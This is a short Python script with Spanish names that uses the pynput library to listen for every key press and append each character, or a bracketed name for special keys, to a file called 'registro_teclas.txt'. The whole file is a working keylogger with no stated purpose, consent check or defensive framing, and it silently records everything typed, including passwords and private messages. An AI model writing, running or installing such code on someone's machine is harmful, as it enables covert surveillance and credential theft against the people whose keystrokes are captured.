from pynput import keyboard


with open("../registro_teclas.txt", "a") as archivo:

    def pulsacion(tecla):
        try:
            archivo.write(f"{tecla.char}")
        except AttributeError:

            archivo.write(f"[{tecla}]")


    with keyboard.Listener(on_press=pulsacion) as listener:
        listener.join()
